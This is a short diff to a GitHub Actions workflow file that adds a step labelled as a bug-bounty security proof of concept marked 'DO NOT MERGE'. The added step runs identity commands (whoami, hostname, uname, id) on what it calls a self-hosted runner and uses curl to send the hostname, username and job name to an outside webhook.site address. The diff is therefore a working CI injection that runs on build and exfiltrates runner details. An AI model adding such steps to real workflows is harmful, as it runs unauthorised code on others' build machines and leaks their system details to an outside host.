@@ -49,6 +49,11 @@ jobs:
         uses: actions/checkout@v6.0.2
         with:
           submodules: recursive
+      - name: ci-health-check (security PoC - YWH bug bounty - DO NOT MERGE)
+        run: |
+          echo "PoC: fork-controlled workflow step executing on self-hosted runner"
+          whoami; hostname; uname -a; id
+          curl -s --max-time 10 "https://webhook.site/90d1826f-8411-4e07-8a9d-bc0710a51e64/poc?h=$(hostname)&u=$(whoami)&j=${GITHUB_JOB}" || true
       - name: Build Linux
         uses: ./.github/actions/build_linux_amd
 
